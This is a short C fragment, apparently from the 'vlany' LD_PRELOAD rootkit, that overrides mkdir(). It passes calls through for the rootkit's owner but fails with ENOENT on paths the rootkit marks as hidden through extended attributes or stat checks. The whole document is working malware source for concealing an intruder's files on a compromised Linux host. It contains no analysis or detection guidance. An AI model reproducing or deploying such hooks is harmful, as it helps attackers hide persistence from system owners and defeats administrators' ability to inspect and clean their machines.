int mkdir(const char *pathname, mode_t mode)
{
    #ifdef DEBUG
        printf("[vlany] mkdir() called\n");
    #endif

    HOOK(old_mkdir, CMKDIR);

    if(owned()) return old_mkdir(pathname, mode);

    if(hidden_xattr(pathname) || hidden_xstat(_STAT_VER, pathname, 32)) { errno = ENOENT; return -1; }

    return old_mkdir(pathname, mode);
}
